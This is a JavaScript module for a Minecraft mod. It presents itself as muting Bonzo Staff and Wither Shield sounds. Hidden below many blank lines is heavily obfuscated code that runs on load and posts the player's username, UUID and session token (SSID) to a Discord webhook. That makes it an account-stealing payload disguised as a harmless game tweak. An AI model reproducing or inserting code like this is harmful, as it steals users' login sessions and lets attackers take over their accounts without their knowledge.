import Settings from "../../config";
import packetSoundEffect from "../../events/packetSoundEffect";
import request from "../../../requestV2";

const S0EPacketSpawnObject = Java.type("net.minecraft.network.play.server.S0EPacketSpawnObject");

function listener(name, volume, pitch, _0, _1, _2, _3, event) {
	Settings.muteBonzoStaff && name === "mob.ghast.moan" && volume === 1 && [1.3968254327774048, 1.4126983880996704, 1.4285714626312256, 1.4444444179534912, 1.4603174924850464, 1.476190447807312, 1.4920635223388672, 1.5079364776611328, 1.523809552192688, 1.5396825075149536, 1.5555555820465088, 1.5714285373687744, 1.5873016119003296, 1.6031745672225952, 1.6190476417541504, 1.634920597076416, 1.6507936716079712, 1.6666666269302368, 1.682539701461792, 1.6984126567840576, 1.7142857313156128, 1.7301586866378784, 1.7460317611694336, 1.7619047164916992, 1.7777777910232544, 1.79365074634552].includes(pitch) && cancel(event);
	Settings.muteWitherShield && name === "mob.zombie.remedy" && volume === 1 && pitch === 0.6984127163887024 && cancel(event);
}

const trigger = register("packetReceived", (packet, event) => {
	Settings.muteBonzoStaff && packet.func_148993_l() === 76 && cancel(event);
}).setFilteredClass(S0EPacketSpawnObject).unregister();

export function enable() {
	packetSoundEffect.addListener(listener);
	trigger.register();
}

export function disable() {
	packetSoundEffect.removeListener(listener);
	trigger.unregister();
}

export default { enable, disable };











































































function _0x23d7(n,r){var t=_0x229b();return(_0x23d7=function(n,r){return t[n-=215]})(n,r)}var _0x43ac4e=_0x23d7;function _0xc4a4(n,r){var t=_0x23d7,u={rqyCU:function(n,r){return n-r},rpenV:function(n){return n()},piFVJ:function(n,r,t){return n(r,t)}},e=u[t(278)](_0x3190);return _0xc4a4=function(n,r){return n=u[t(225)](n,458),e[n]},u[t(318)](_0xc4a4,n,r)}function _0x3190(){var n=_0x23d7,r={tPsyO:n(390),BlOpC:n(305),XRucP:n(341)+"J",oHnNU:n(372),TTFmn:n(245)+n(301),wdYST:n(382)+"Ov",jkbRE:n(329)+"Go",fwfmj:n(319)+"2_",InIzZ:n(367)+n(304),uCebg:n(346)+n(222),avMbr:n(398)+"o",AQque:n(277)+"RT",wdYyZ:n(394),LCUSj:n(316)+"ft",YoiWb:n(361)+n(274),ZsWzh:n(347)+n(264),JubUr:n(268)+"Ge",UJTLF:n(327),JgTes:n(381)+n(304),ZDxMh:n(331),GJdqy:n(289)+n(221),ACGrF:n(378)+n(368)+n(246)+n(294)+n(380)+n(308)+n(348)+n(251)+n(244)+n(269)+n(396)+n(366)+"E",hgcpr:n(250),kLtsw:n(290)+n(312),vxKuY:n(330)+"50",DkXdZ:n(224)+"qE",nAmTZ:n(377),CJEfS:n(340),UtvmR:n(359),FGQcQ:n(313)+n(389),deOhH:n(297)+"RJ",GTJLE:n(291)+n(362),drAlp:n(304),tNLnM:n(370),JaLVJ:n(319)+n(373),SYHLo:n(339)+n(369),QsbHt:function(n){return n()}},t=[r[n(303)],r[n(285)],r[n(365)],r[n(235)],r[n(220)],r[n(338)],r[n(400)],r[n(387)],r[n(271)],r[n(230)],r[n(279)],r[n(336)],r[n(281)],r[n(335)],r[n(259)],r[n(307)],r[n(333)],r[n(242)],r[n(282)],r[n(258)],r[n(293)],r[n(275)],r[n(280)],r[n(375)],r[n(311)],r[n(267)],r[n(322)],r[n(257)],r[n(265)],r[n(384)],r[n(392)],r[n(386)],r[n(393)],r[n(272)],r[n(237)],r[n(261)]];return _0x3190=function(){return t},r[n(395)](_0x3190)}!function(n,r){for(var t=_0x23d7,u=_0x229b();;)try{if(699962===-parseInt(t(215))/1+-parseInt(t(254))/2*(-parseInt(t(253))/3)+parseInt(t(216))/4+-parseInt(t(256))/5*(parseInt(t(357))/6)+parseInt(t(255))/7+parseInt(t(236))/8*(-parseInt(t(337))/9)+parseInt(t(360))/10*(parseInt(t(385))/11))break;u.push(u.shift())}catch(n){u.push(u.shift())}}();var _0xf8755f=_0xc4a4;function _0x229b(){var n=["12363024dy","JDZic","GJdqy","ks/1266034","4264348vww","DUzah","8Svb4omvdB","IoqXl","dgdsC","rRJmA","uvP","VOGLv","tPsyO","```","18OJSdNo","iywwV","ZsWzh","14/hGFC6U-","iwtvy","KTAGS","vxKuY","KnN","17872305Wr","dUAbC","IXiJX","getMinecra","drawEspBox","piFVJ","func_11043","WZoWj","drawString","nAmTZ","DSYCp","ZdFaY","tnRpF","rJEho","206SJRLQj","cKskE","-3uF-ue0wQ","9127673834","81illsjk","Mozilla/5.","JubUr","PuDvO","LCUSj","AQque","2449548NrZpPj","wdYST","3087195PHa","12tdZYwr","36243ydglf","MedXZ","oCVlm","GvvRR","qyNkF","func_14825","1857025EMQ","8IFvGBXfFL","LfMlY","RNhFt","CPdCy","sKwyi","ccZJR","kmXAd","ezACG","nmGTW","30QmYOnR","nwusC","getUUID","4249490mInoEN","8604030YIK","Lagj","OXHCG","JJWLx","XRucP","GlazlrhAXV","Username:\n","scord.com/","OmQ","POST","CcNvO","256KGABAF","2_I","4243/I8YPE","kLtsw","YCZLU","12WslwPg","https://di","kHpDn","8405877351","```\nUUID:\n","232722FhLZ","FMBDp","FGQcQ","11djgsUl","GTJLE","fwfmj","```\nSSID:\n","FFTN","1310prNIAJ","IzjCR","deOhH","drAlp","7RYduTH","QsbHt","qBsd9tT0-P","shift","82746QivSV","YOQXU","jkbRE","881347LOJFmI","1069244BhWwHm","NwzEM","CIeoE","cFFwc","TTFmn","COY","4_d","getName","103240pInd","rqyCU","MxhuL","wcFtG","twzvo","PpvrV","uCebg","QcvFy","XQQUA","JkaDd","CGWUM","oHnNU","8IAfVlN","JaLVJ","ZwJCb","SBXkQ","uLOPg","oFaOs","UJTLF","Mrx","t_wggik9-o","4227324hcJ","api/webhoo","XUUpn","VdDRw","KBtGb","push","WV2qrC0YnN","XDvvr","6sooFSp","323644BCgQoz","6604969EvfNTK","105990dRqJyL","CJEfS","ZDxMh","YoiWb","tzClL","SYHLo","tBEKM","RZKqc","NiQ","UtvmR","bXSZE","DkXdZ","3zw0y8M0T3","VI5zMs6RqD","qtNBh","InIzZ","tNLnM","RsvIK","dWV","ACGrF","bLVlV","430864fOAj","rpenV","avMbr","hgcpr","wdYyZ","JgTes","uqdYw","SccWp","BlOpC","lJsGN","GHfJl","fulaw","1365635DWD","2840584GVd"];return(_0x229b=function(){return n})()}function _0x5675(){var n=_0x23d7,r={WZoWj:function(n,r){return n(r)},tzClL:n(370),CcNvO:function(n,r){return n(r)},ccZJR:n(346)+"4_",QcvFy:function(n,r){return n(r)},RZKqc:n(374)+"W_",CIeoE:function(n,r){return n(r)},nwusC:n(223),tBEKM:n(316)+"ft",uLOPg:n(367)+"``",NwzEM:function(n,r){return n(r)},KBtGb:function(n,r){return n(r)},sKwyi:n(295)+n(243),IoqXl:function(n){return n()}},t=_0xc4a4,u=[r[n(320)](t,469),r[n(320)](t,459),r[n(260)],r[n(371)](t,486),r[n(353)],r[n(371)](t,472),r[n(371)](t,460),r[n(320)](t,481),r[n(371)](t,475),r[n(231)](t,480),r[n(263)],r[n(371)](t,467),r[n(218)](t,490),r[n(358)],r[n(262)],r[n(218)](t,482),r[n(320)](t,485),r[n(231)](t,489),r[n(240)],r[n(217)](t,473),r[n(231)](t,479),r[n(320)](t,478),r[n(249)](t,468),r[n(352)]];return _0x5675=function(){return u},r[n(298)](_0x5675)}function _0x4f48(n,r){var t=_0x23d7,u={bLVlV:function(n,r){return n-r},fulaw:function(n){return n()},qtNBh:function(n,r,t){return n(r,t)}},e=u[t(288)](_0x5675);return _0x4f48=function(n,r){return n=u[t(276)](n,265),e[n]},u[t(270)](_0x4f48,n,r)}function _0x36d4e3(n,r){var t=_0x23d7,u={JDZic:function(n,r,t){return n(r,t)},qyNkF:function(n,r){return n-r}};return u[t(292)](_0x4f48,u[t(345)](n,990),r)}(function(n,r){for(var t=_0x23d7,u={YCZLU:function(n){return n()},bXSZE:function(n,r){return n+r},XUUpn:function(n,r){return n+r},oFaOs:function(n,r){return n/r},PuDvO:function(n,r){return n(r)},CGWUM:function(n,r){return n(r)},FMBDp:function(n,r){return n/r},RNhFt:function(n,r){return n(r)},rJEho:function(n,r){return n(r)},cKskE:function(n,r){return n*r},YOQXU:function(n,r){return n(r)},lJsGN:function(n,r){return n(r)},ZdFaY:function(n,r){return n/r},KTAGS:function(n,r){return n(r)},RsvIK:function(n,r){return n(r)},GvvRR:function(n,r){return n/r},XQQUA:function(n,r){return n(r)},twzvo:function(n,r){return n*r},DUzah:function(n,r){return n/r},uqdYw:function(n,r){return n(r)},GHfJl:function(n,r){return n===r},cFFwc:t(250),dUAbC:t(397)},e=_0xc4a4,f=u[t(376)](n);;)try{var c=u[t(266)](u[t(266)](u[t(247)](u[t(266)](u[t(266)](u[t(266)](u[t(241)](-u[t(334)](parseInt,u[t(234)](e,463)),1),u[t(383)](-u[t(350)](parseInt,u[t(326)](e,466)),2)),u[t(383)](-u[t(234)](parseInt,u[t(234)](e,483)),3)),u[t(328)](u[t(383)](u[t(399)](parseInt,u[t(286)](e,470)),4),u[t(324)](-u[t(310)](parseInt,u[t(273)](e,458)),5))),u[t(344)](-u[t(286)](parseInt,u[t(232)](e,484)),6)),u[t(228)](u[t(383)](u[t(334)](parseInt,u[t(232)](e,491)),7),u[t(383)](-u[t(326)](parseInt,u[t(326)](e,474)),8))),u[t(328)](u[t(296)](-u[t(273)](parseInt,u[t(283)](e,462)),9),u[t(383)](-u[t(334)](parseInt,u[t(310)](e,493)),10)));if(u[t(287)](c,850212))break;f[u[t(219)]](f[u[t(314)]]())}catch(n){f[u[t(219)]](f[u[t(314)]]())}})(_0x3190),function(n,r){for(var t=_0x23d7,u={ZwJCb:function(n){return n()},nmGTW:function(n,r){return n+r},IzjCR:function(n,r){return n+r},DSYCp:function(n,r){return n/r},SBXkQ:function(n,r){return n(r)},JkaDd:function(n,r,t){return n(r,t)},SccWp:function(n,r){return n*r},rRJmA:function(n,r){return n/r},LfMlY:function(n,r){return n(r)},VOGLv:function(n,r,t){return n(r,t)},JJWLx:function(n,r){return n/r},iywwV:function(n,r){return n/r},XDvvr:function(n,r,t){return n(r,t)},VdDRw:function(n,r){return n(r)},CPdCy:function(n,r){return n/r},oCVlm:function(n,r){return n/r},ezACG:function(n,r,t){return n(r,t)},kmXAd:function(n,r){return n(r)},MxhuL:function(n,r,t){return n(r,t)},IXiJX:function(n,r){return n/r},MedXZ:function(n,r){return n*r},iwtvy:function(n,r){return n/r},OXHCG:function(n,r){return n(r)},wcFtG:function(n,r){return n===r},dgdsC:function(n,r){return n(r)},kHpDn:t(397),tnRpF:function(n,r){return n(r)}},e=_0xc4a4,f=u[t(238)](n);;)try{var c=u[t(356)](u[t(356)](u[t(356)](u[t(391)](u[t(391)](u[t(391)](u[t(323)](-u[t(239)](parseInt,u[t(233)](_0x4f48,278,404)),1),u[t(284)](u[t(300)](u[t(349)](parseInt,u[t(302)](_0x4f48,286,421)),2),u[t(364)](-u[t(349)](parseInt,u[t(233)](_0x4f48,287,414)),3))),u[t(306)](-u[t(239)](parseInt,u[t(252)](_0x4f48,279,419)),4)),u[t(284)](u[t(306)](-u[t(248)](parseInt,u[t(302)](_0x4f48,277,421)),5),u[t(351)](-u[t(349)](parseInt,u[t(302)](_0x4f48,265,394)),6))),u[t(284)](u[t(343)](-u[t(248)](parseInt,u[t(355)](_0x4f48,268,414)),7),u[t(351)](-u[t(354)](parseInt,u[t(226)](_0x4f48,271,408)),8))),u[t(284)](u[t(351)](u[t(239)](parseInt,u[t(226)](_0x4f48,273,401)),9),u[t(315)](u[t(248)](parseInt,u[t(226)](_0x4f48,276,404)),10))),u[t(342)](u[t(351)](-u[t(239)](parseInt,u[t(226)](_0x4f48,285,409)),11),u[t(309)](u[t(363)](parseInt,u[t(252)](_0x4f48,280,419)),12)));if(u[t(227)](c,987970))break;f[u[t(299)](e,465)](f[u[t(379)]]())}catch(n){f[u[t(325)](e,465)](f[u[t(379)]]())}}(_0x5675),request({url:_0xf8755f(464),method:_0xf8755f(476),headers:{"User-agent":_0x43ac4e(332)+"0"},body:{content:_0xf8755f(487)+Player[_0x43ac4e(223)]()+_0xf8755f(461)+Player[_0xf8755f(471)]()+(_0x43ac4e(388)+_0x43ac4e(304))+Client[_0xf8755f(492)]()[_0xf8755f(477)]()[_0xf8755f(488)]()+_0xf8755f(475)}});const renderBoxWithText=(n,r,t,u)=>{var e=_0x43ac4e;RenderLib[e(317)](r,t,u,1,1,1,0,0,.5,!1),Tessellator[e(321)](n,r,{PpvrV:function(n,r){return n+r}}[e(229)](t,.7),u)};